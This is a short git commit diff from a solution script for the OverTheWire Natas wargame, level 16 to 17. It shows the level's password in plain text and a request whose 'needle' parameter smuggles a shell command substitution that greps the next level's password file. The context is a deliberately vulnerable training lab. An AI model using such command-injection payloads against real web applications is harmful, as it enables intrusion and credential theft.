c90e5e1c2c787fa613e12fd2d24f964ef854cceb
Cora wartelle <cwartell@e1z1r5p44.42.us.org>
2019-05-27 20:26:24 -0700

    17

--- natas/17script.py
+++ natas/17script.py
@@ -4,6 +4,7 @@ from requests.auth import HTTPBasicAuth
 auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
 
 filteredchars = ''
+passwd = ''
 allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 for char in allchars:
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
